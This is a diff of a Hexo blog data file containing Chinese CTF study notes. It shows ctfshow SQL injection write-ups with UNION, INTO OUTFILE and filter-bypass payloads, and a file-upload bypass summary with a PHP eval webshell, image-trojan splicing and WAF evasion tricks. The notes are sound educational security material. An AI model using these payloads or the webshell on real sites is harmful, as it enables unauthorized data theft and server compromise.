-<p>仿照web174构造</p>
-<p><code>1&#39; union select username,password from ctfshow_user5 where username=&quot;flag&quot; into outfile &#39;/var/www/html/ctfshow.txt&#39; --+ </code></p>
-<p>在网站根目录下写入文件<code>ctfshow.txt</code></p>
-<blockquote>
-<p>Apache默认根目录是:/var/www/html</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709100434410"></p>
-<h4 id="二分法盲注"><a href="#二分法盲注" class="headerlink" title="二分法盲注"></a>二分法盲注</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于无过滤的sql注入，可以通过<code>十六进制</code>或<code>base64</code>编码替换进行绕过，还可以跑盲注脚本，利用二分法或sleep()函数；还可以尝试是否有权限写入网站根目录文件，然后直接访问该文件</p>
-<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
-<h2 id="day5-web入门之sql注入-过滤注入"><a href="#day5-web入门之sql注入-过滤注入" class="headerlink" title="day5 web入门之sql注入-过滤注入"></a>day5 web入门之sql注入-过滤注入</h2><h3 id="web176-select被过滤"><a href="#web176-select被过滤" class="headerlink" title="web176-select被过滤"></a>web176-select被过滤</h3><p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709105105072"></p>
-<p><code>1&#39; Union select 1,2,3--+</code>无回显</p>
-<p><code>1&#39; union Select 1,2,3--+</code>有回显</p>
-<p>经过测试是只对<code>select</code>进行了过滤，通过大小写绕过</p>
-<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39; union Select 1,group_concat(username),group_concat(password) from ctfshow_user where username=&quot;flag&quot;--+</code></p>
-<h3 id="web177-空格和-被过滤"><a href="#web177-空格和-被过滤" class="headerlink" title="web177-空格和#被过滤"></a>web177-空格和#被过滤</h3><p><code>1&#39;--+</code>无回显，<code>1&#39;--</code>无回显，<code>--</code>被过滤</p>
-<p><code>1&#39;#</code>无回显，<code>#</code>也被过滤，使用url编码<code>%23</code>绕过，<code>1&#39;%23</code>有回显</p>
-<p>而在判断字段时又没有回显，好家伙原来吧空格也过滤了，使用<code>/**/</code>绕过，字段数还是3</p>
-<blockquote>
-<p>空格绕过的方式：</p>
-<ol>
-<li>注释符<code>/**/</code>，tab键<code>%a0</code></li>
-<li>括号绕过，常用于时间盲注</li>
-</ol>
-</blockquote>
-<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;/**/union/**/select/**/1,group_concat(username),group_concat(password)/**/from/**/ctfshow_user/**/where/**/username=&quot;flag&quot;/**/%23</code></p>
-<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p><code>/**/</code>和<code>%a0</code>被过滤，使用括号或是<code>%0a,%09,%0b,%0c,%0d</code>都行</p>
-<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union(select(1),(username),(password)from(ctfshow_user)where(username=&quot;flag&quot;))%23</code></p>
-<p><img src="https://i.loli.net/2021/07/11/7cWRP95YaJb8AwS.png" alt="image-20210709170348722"></p>
-<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>只剩下<code>%0c</code>可以用了，其他都被过滤了</p>
-<p><img src="https://i.loli.net/2021/07/09/iQ5YydxOWqcsouf.png" alt="image-20210709172329770"></p>
-<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p><code>1&#39;union%0cselect%0c1,username,password%0cfrom%0cctfshow_user%0cwhere%0cusername=&quot;flag&quot;%0c%0c%23</code></p>
-<p><img src="https://i.loli.net/2021/07/09/AGwtTmJbDRxkiPN.png" alt="image-20210709173023533"></p>
-<p>晴天师傅的通杀payload</p>
-<p><code>?id=&#39;or(1)%23</code></p>
-<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>是对<code>%23</code>进行了过滤，不能注释后面的’了，只能通过构造<code>&#39;1&#39;=&#39;1</code></p>
-<p>贴上Y4tacker师傅的</p>
-<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><p><code>-1&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>-1就是用来注释的，这个payload也相当于<code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
-<p>放进这个拼接的语句中就是<code>where username !=&#39;flag&#39; and id=&#39;&#39;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1;&quot;</code></p>
-<p><img src="https://i.loli.net/2021/07/09/N2JdzpWZDRIHT16.png" alt="image-20210709200537410"></p>
-<p>又因为and的优先级比or高，那就又相当于</p>
-<p><code>(username !=&#39;flag&#39; and id = &#39;&#39;)  or  (id=26 and&#39;1&#39;=&#39;1&#39;)</code></p>
-<p>or右边的值为1，可以读出id=26的数据</p>
-<p>还可以盲注</p>
-<p><img src="https://i.loli.net/2021/07/09/vQoe79qtV3Pjg2z.png" alt="image-20210709201034411"></p>
-<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><p>除了括号其他能代替的都被过滤了，继续使用y4师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/SvKtyFL3j4oGA7g.png" alt="image-20210709210302177"></p>
-<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>这次又把<code>flag</code>给过滤了，继续用师傅的payload</p>
-<p><img src="https://i.loli.net/2021/07/09/MxH1Q9EOYT7FNyG.png" alt="image-20210709212746118"></p>
-<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><p>我是fw</p>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">sql注入绕过技巧</a></p>
-<h2 id="参考博客-1"><a href="#参考博客-1" class="headerlink" title="参考博客"></a>参考博客</h2><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">[CTFSHOW]SQL注入(WEB入门)</a></p>
-<p><a href="https://yq1ng.github.io/z_post/CTFSHOW-WEB%E5%85%A5%E9%97%A8-Ttick%E6%80%BB%E7%BB%93/#more">CTFSHOW WEB入门 Ttick总结</a></p>
-<p><a href="https://blog.csdn.net/rfrder/article/details/113664639">CTFshow-WEB入门-SQL注入(上)</a></p>
-]]></content>
-      <categories>
-        <category>ctf-sql</category>
-      </categories>
-      <tags>
-        <tag>ctf-sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctfhub之ssrf</title>
     <url>/2021/07/19/ctfhub%E4%B9%8Bssrf/</url>
     <content><![CDATA[<h1 id="ctfshow之ssrf"><a href="#ctfshow之ssrf" class="headerlink" title="ctfshow之ssrf"></a>ctfshow之ssrf</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h2 id="内网访问（http协议）"><a href="#内网访问（http协议）" class="headerlink" title="内网访问（http协议）"></a>内网访问（http协议）</h2><p>尝试访问位于127.0.0.1的flag.php吧</p>
@@ -440,6 +440,7 @@
 <p>又耗了半天，暂时没有复现成功，</p>
 <h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p><a href="https://www.cnblogs.com/CoLo/p/14499041.html">Fastjson1.2.24RCE漏洞复现</a></p>
 <p><a href="https://www.freebuf.com/articles/web/242712.html">Fastjson1.2.24漏洞复现详细过程</a></p>
+<p><a href="https://www.cnblogs.com/cute-puli/p/13466362.html">复现</a></p>
 ]]></content>
       <categories>
         <category>fastjson</category>
@@ -1050,182 +1051,6 @@
       </tags>
   </entry>
   <entry>
-    <title>常见web漏洞学习之文件上传知识点总结</title>
-    <url>/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
-<p>.htacess的Apache解析漏洞</p>
-<p>配合文件包含，图片马</p>
-<p>条件竞争</p>
-</blockquote>
-<h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>js校验后缀名</p>
-<p>绕过：先把木马改为jpg或其他形式，burp抓包后修改为php</p>
-<h3 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h3><ol>
-<li>MIME</li>
-</ol>
-<p>绕过：burp修改文件头content-type字段为image/gif</p>
-<ol start="2">
-<li>文件内容头</li>
-</ol>
-<p>在<img src alt="img">马之前加上一些图片信息，如</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a&lt;?php @eval($_POST[&#39;caidao&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<ol>
-<li>文件扩展名校验（白名单，黑名单）</li>
-<li>文件内容检测（检测内容是否合法或是是否有恶意代码）</li>
-</ol>
-<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol>
-<li><strong>大小写、双写</strong>绕过pphphp</li>
-<li>文件名后加上个**.<strong>或是</strong>空格**（burp中修改）</li>
-</ol>
-<ul>
-<li>🔲尝试黑名单可能没有的类型，如<strong>asa、cer、.htaccess</strong></li>
-</ul>
-<blockquote>
-<p>.htaccess是Apache的</p>
-</blockquote>
-<ol start="4">
-<li><p>修改后缀类型，php修改为<strong>php3、php5</strong>（php高版本会向低版本兼容）</p>
-</li>
-<li><p>针对Windows系统，上传不符合Windows命名规则的文件名，可以尝试**::$DATA<strong>进行绕过或是</strong>:1.jpg**</p>
-</li>
-</ol>
-<blockquote>
-<p>windows下文件名+::$DATA，会把它当做数据流来处理，不会检验文件的后缀名，并且保留::$DATA之前的的文件名及后缀</p>
-<p>简单来说，数据流$DATA是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
-</blockquote>
-<ol start="6">
-<li><strong>%00</strong>截断，解析的时候会自动忽略%00后面的内容</li>
-</ol>
-<blockquote>
-<ul>
-<li>常用在服务端把文件路径和文件名加在一起进行判断后缀</li>
-<li>截断条件：</li>
-</ul>
-<p><em>php &lt; 5.3.4</em></p>
-<p>php.ini文件<em>magic_quotes_gpc</em>为<em>off</em>（这个函数的作用是转义字符，在php&gt;5.4.0中已经移除了） </p>
-<ul>
-<li>当参数是以post方式传入时，需要二进制修改 <code>2e</code>改为<code>00</code></li>
-</ul>
-</blockquote>
-<ol start="7">
-<li>🔲配合<strong>文件包含</strong>使用</li>
-</ol>
-<blockquote>
-<p>上传<strong>图片马</strong></p>
-<p>拼接图片马：copy xxx.jpg /b + shell.php /a shell.jpg （b是binary二进制的意思，/b就是以二进制的格式）</p>
-<p>进行文件包含</p>
-</blockquote>
-<ol start="8">
-<li>🔲<strong>条件竞争</strong></li>
-</ol>
-<blockquote>
-<p>简单来说就是利用了并发处理请求不当或是相关操作逻辑顺序设计不合理时，会导致条件竞争的发生</p>
-<p>具体实例可见upload-labs pass17、18</p>
-<p>pass17源码 – 利用方式：在文件删除之前访问文件</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  &#x2F;&#x2F;$_FILES数组，$file_name就是upload_file的文件名</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];  &#x2F;&#x2F;$temp_file就是upload_file的临时文件名</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  &#x2F;&#x2F;返回$file_name的文件后缀</span><br><span class="line">    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  &#x2F;&#x2F;对$temp_file进行合法检验</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  &#x2F;&#x2F;判断$file_ext是否在$ext_arr中，即判断文件后缀是否合法</span><br><span class="line">             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;  &#x2F;&#x2F;如果后缀不合法</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
-<li>trim(string,charlist) ——<strong>移除</strong>字符串两侧的空白或其他预定义的字符charlist</li>
-<li>strrchr(string,char) ——在string中<strong>查找</strong>char最后出现的位置，并返回（<strong>截取</strong>）包括char在内到字符串末尾的所有字符</li>
-<li>str_ireplace(find,replace,string) ——在string中找到find，然后进行<strong>替换</strong>replace</li>
-<li>substr(string,start,length可选) ——在string中从start处开始，<strong>返回</strong>length长度的<strong>字符串</strong></li>
-<li>strrpos(string,find,start可选) ——在string中从start开始，<strong>返回</strong>最后一次出现的<strong>位置</strong></li>
-<li>move_uploaded_file(string $filename,string $destination) ——检测确保上传的文件filename是合法的（即通过post方式上传），如果合法就将其<strong>移动</strong>为由destination指定的文件</li>
-<li>in_array(data,array) —— 检查数组array中是否存在某个值data</li>
-</ul>
-<h2 id="bypass之waf"><a href="#bypass之waf" class="headerlink" title="bypass之waf"></a>bypass之waf</h2><p>总体的思路就是让waf无法获取到文件名或是其他方式无法判断上传的木马（php、jsp、asp、aspx等）</p>
-<h3 id="waf检查的东西"><a href="#waf检查的东西" class="headerlink" title="waf检查的东西"></a>waf检查的东西</h3><p>根据前面的学习，猜测waf会检查</p>
-<ul>
-<li>MIME类型</li>
-<li>文件扩展名</li>
-<li>文件内容</li>
-</ul>
-<p>除此之外还会检查</p>
-<ul>
-<li>请求的url</li>
-<li>Boundary边界</li>
-</ul>
-<h3 id="常见扩展名黑名单："><a href="#常见扩展名黑名单：" class="headerlink" title="常见扩展名黑名单："></a>常见扩展名黑名单：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line"></span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line"></span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line"></span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure>
-
-
-<p>这里并没有进行复现，只是可能进行绕过的一些思路</p>
-<h3 id="增加Content-Disposition字段长度"><a href="#增加Content-Disposition字段长度" class="headerlink" title="增加Content-Disposition字段长度"></a>增加Content-Disposition字段长度</h3><blockquote>
-<p>在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。</p>
-<p>在  multipart/form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart  消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。</p>
-<p>Content-Disposition 消息头最初是在 MIME 标准中定义的，HTTP 表单及 POST 请求只用到了其所有参数的一个子集。只有 form-data 以及可选的 name 和 filename 三个参数可以应用在HTTP场景中。</p>
-</blockquote>
-<h3 id="对文件名进行修改"><a href="#对文件名进行修改" class="headerlink" title="对文件名进行修改"></a>对文件名进行修改</h3><ol>
-<li>去除filename=”shell.php”中的双引号或是修改为单引号，扰乱匹配</li>
-<li>因为文件在上传时接收的是最后一个文件，那么尝试在这之前加一些干扰的filename参数</li>
-</ol>
-<blockquote>
-<p>Content-Disposition: form-data; name=”file”; filename=1.jpg;  filename=”shell.php”</p>
-</blockquote>
-<ol>
-<li>当是对所有的filename进行检测时，尝试将前面的filename去掉</li>
-</ol>
-<blockquote>
-<p>Content-Disposition: form-data; name=”file”; filename= ;  filename=”shell.php”</p>
-</blockquote>
-<h3 id="在文件名中间加符号扰乱匹配，如"><a href="#在文件名中间加符号扰乱匹配，如" class="headerlink" title="在文件名中间加符号扰乱匹配，如"></a>在文件名中间加符号扰乱匹配，如</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;</span><br><span class="line">&#39;</span><br><span class="line"> (空格)</span><br></pre></td></tr></table></figure>
-<h3 id="对filename动手脚"><a href="#对filename动手脚" class="headerlink" title="对filename动手脚"></a>对filename动手脚</h3><blockquote>
-<p>让waf对filename这个字符串匹配不到，但是服务器又可以接收，加入换行这类的干扰</p>
-</blockquote>
-<h4 id="可能的绕过"><a href="#可能的绕过" class="headerlink" title="可能的绕过"></a>可能的绕过</h4><ol>
-<li>对文件名中的每个字符进行换行</li>
-<li>切断filename=和之后的值（换行）</li>
-<li>文件名换行，就是在HEX中加入0a</li>
-</ol>
-<h3 id="修改匹配字段"><a href="#修改匹配字段" class="headerlink" title="修改匹配字段"></a>修改匹配字段</h3><blockquote>
-<p>filename参数是在post包中的 Content-Disposition 字段，那么waf也是先匹配到这个http头在对内容进行检测，我们可以尝试对这个头的特征进行修改</p>
-<p>我们尝试去掉这个form-data   (form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)</p>
-</blockquote>
-<ol>
-<li>去掉form-data</li>
-<li>对Content-Disposition 字段进行参数污染、Content-Disposition大小写混淆</li>
-</ol>
-<blockquote>
-<p>Content-Disposition 字段参数污染</p>
-</blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537709838-cca051af-9c06-47ed-afb8-bc4fa3a77a03.png" alt="image.png"></p>
-<ol>
-<li>添加额外的Content-Type字段</li>
-</ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537878758-5e4a903f-245e-4d4d-b8c0-483ac68a0bde.png" alt="image.png"></p>
-<ol>
-<li>添加额外的filename进行参数污染</li>
-</ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1622537967923-04649433-fbab-4386-8491-0b0b08e35ed6.png" alt="image.png"></p>
-<ol>
-<li>添加额外的Content-Length头</li>
-</ol>
-<h3 id="多个等号"><a href="#多个等号" class="headerlink" title="多个等号"></a>多个等号</h3><blockquote>
-<p>就是将filename=处添加多个等号</p>
-</blockquote>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
-<p>产生的原因是0x00为十六进制表示法，ASCII码里就为0，有些函数在处理时会将其当做结束符；当url中出现%00会认为读取已经结束</p>
-</blockquote>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>[文件上传Bypass安全狗 ](</p>
-<h3 id="参考的一些博客"><a href="#参考的一些博客" class="headerlink" title="参考的一些博客"></a>参考的一些博客</h3><p><a href="https://blog.csdn.net/qq_39670065/article/details/107366077?spm=1001.2014.3001.5501">upload-labs通关记录</a></p>
-<p><a href="https://xz.aliyun.com/t/4029#toc-15">Upload-labs 20关通关笔记</a></p>
-<p><a href="https://wiki.wgpsec.org/knowledge/web/fileuploads.html">狼组公开文库</a></p>
-<p><a href="https://www.cnblogs.com/luolaobiao/p/9917878.html">常见的文件上传绕过和文件解析漏洞</a></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见web漏洞学习之CSRF</title>
     <url>/2021/07/14/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BCSRF/</url>
     <content><![CDATA[<h1 id="csrf学习"><a href="#csrf学习" class="headerlink" title="csrf学习"></a>csrf学习</h1><p>跨站请求伪造</p>
@@ -1450,6 +1275,182 @@
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/realjh/article/details/82048492">Linux下Centos7对外开放端口</a></p>
 <p><a href="https://www.cnblogs.com/heqiuyong/p/10460150.html">Centos7开放及查看端口</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>常见web漏洞学习之文件上传知识点总结</title>
+    <url>/2021/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="常见web漏洞学习之文件上传"><a href="#常见web漏洞学习之文件上传" class="headerlink" title="常见web漏洞学习之文件上传"></a>常见web漏洞学习之文件上传</h2><blockquote>
+<p>.htacess的Apache解析漏洞</p>
+<p>配合文件包含，图片马</p>
+<p>条件竞争</p>
+</blockquote>
+<h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>js校验后缀名</p>
+<p>绕过：先把木马改为jpg或其他形式，burp抓包后修改为php</p>
+<h3 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h3><ol>
+<li>MIME</li>
+</ol>
+<p>绕过：burp修改文件头content-type字段为image/gif</p>
+<ol start="2">
+<li>文件内容头</li>
+</ol>
+<p>在<img src alt="img">马之前加上一些图片信息，如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a&lt;?php @eval($_POST[&#39;caidao&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<ol>
+<li>文件扩展名校验（白名单，黑名单）</li>
+<li>文件内容检测（检测内容是否合法或是是否有恶意代码）</li>
+</ol>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><ol>
+<li><strong>大小写、双写</strong>绕过pphphp</li>
+<li>文件名后加上个**.<strong>或是</strong>空格**（burp中修改）</li>
+</ol>
+<ul>
+<li>🔲尝试黑名单可能没有的类型，如<strong>asa、cer、.htaccess</strong></li>
+</ul>
+<blockquote>
+<p>.htaccess是Apache的</p>
+</blockquote>
+<ol start="4">
+<li><p>修改后缀类型，php修改为<strong>php3、php5</strong>（php高版本会向低版本兼容）</p>
+</li>
+<li><p>针对Windows系统，上传不符合Windows命名规则的文件名，可以尝试**::$DATA<strong>进行绕过或是</strong>:1.jpg**</p>
+</li>
+</ol>
+<blockquote>
+<p>windows下文件名+::$DATA，会把它当做数据流来处理，不会检验文件的后缀名，并且保留::$DATA之前的的文件名及后缀</p>
+<p>简单来说，数据流$DATA是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:lake2.asp，请求 a.asp:lake2.asp::$DATA，则是请求a.asp中的流数据lake2.asp的流数据内容。</p>
+</blockquote>
+<ol start="6">
+<li><strong>%00</strong>截断，解析的时候会自动忽略%00后面的内容</li>
+</ol>
+<blockquote>
+<ul>
+<li>常用在服务端把文件路径和文件名加在一起进行判断后缀</li>
+<li>截断条件：</li>
+</ul>
+<p><em>php &lt; 5.3.4</em></p>
+<p>php.ini文件<em>magic_quotes_gpc</em>为<em>off</em>（这个函数的作用是转义字符，在php&gt;5.4.0中已经移除了） </p>
+<ul>
+<li>当参数是以post方式传入时，需要二进制修改 <code>2e</code>改为<code>00</code></li>
+</ul>
+</blockquote>
+<ol start="7">
+<li>🔲配合<strong>文件包含</strong>使用</li>
+</ol>
+<blockquote>
+<p>上传<strong>图片马</strong></p>
+<p>拼接图片马：copy xxx.jpg /b + shell.php /a shell.jpg （b是binary二进制的意思，/b就是以二进制的格式）</p>
+<p>进行文件包含</p>
+</blockquote>
+<ol start="8">
+<li>🔲<strong>条件竞争</strong></li>
+</ol>
+<blockquote>
+<p>简单来说就是利用了并发处理请求不当或是相关操作逻辑顺序设计不合理时，会导致条件竞争的发生</p>
+<p>具体实例可见upload-labs pass17、18</p>
+<p>pass17源码 – 利用方式：在文件删除之前访问文件</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$is_upload &#x3D; false;</span><br><span class="line">$msg &#x3D; null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br><span class="line">    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  &#x2F;&#x2F;$_FILES数组，$file_name就是upload_file的文件名</span><br><span class="line">    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];  &#x2F;&#x2F;$temp_file就是upload_file的临时文件名</span><br><span class="line">    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);  &#x2F;&#x2F;返回$file_name的文件后缀</span><br><span class="line">    $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  &#x2F;&#x2F;对$temp_file进行合法检验</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  &#x2F;&#x2F;判断$file_ext是否在$ext_arr中，即判断文件后缀是否合法</span><br><span class="line">             $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload &#x3D; true;</span><br><span class="line">        &#125;else&#123;  &#x2F;&#x2F;如果后缀不合法</span><br><span class="line">            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg &#x3D; &#39;上传出错！&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><ul>
+<li>trim(string,charlist) ——<strong>移除</strong>字符串两侧的空白或其他预定义的字符charlist</li>
+<li>strrchr(string,char) ——在string中<strong>查找</strong>char最后出现的位置，并返回（<strong>截取</strong>）包括char在内到字符串末尾的所有字符</li>
+<li>str_ireplace(find,replace,string) ——在string中找到find，然后进行<strong>替换</strong>replace</li>
+<li>substr(string,start,length可选) ——在string中从start处开始，<strong>返回</strong>length长度的<strong>字符串</strong></li>
+<li>strrpos(string,find,start可选) ——在string中从start开始，<strong>返回</strong>最后一次出现的<strong>位置</strong></li>
+<li>move_uploaded_file(string $filename,string $destination) ——检测确保上传的文件filename是合法的（即通过post方式上传），如果合法就将其<strong>移动</strong>为由destination指定的文件</li>
+<li>in_array(data,array) —— 检查数组array中是否存在某个值data</li>
+</ul>
+<h2 id="bypass之waf"><a href="#bypass之waf" class="headerlink" title="bypass之waf"></a>bypass之waf</h2><p>总体的思路就是让waf无法获取到文件名或是其他方式无法判断上传的木马（php、jsp、asp、aspx等）</p>
+<h3 id="waf检查的东西"><a href="#waf检查的东西" class="headerlink" title="waf检查的东西"></a>waf检查的东西</h3><p>根据前面的学习，猜测waf会检查</p>
+<ul>
+<li>MIME类型</li>
+<li>文件扩展名</li>
+<li>文件内容</li>
+</ul>
+<p>除此之外还会检查</p>
+<ul>
+<li>请求的url</li>
+<li>Boundary边界</li>
+</ul>
+<h3 id="常见扩展名黑名单："><a href="#常见扩展名黑名单：" class="headerlink" title="常见扩展名黑名单："></a>常见扩展名黑名单：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line"></span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line"></span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line"></span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure>
+
+
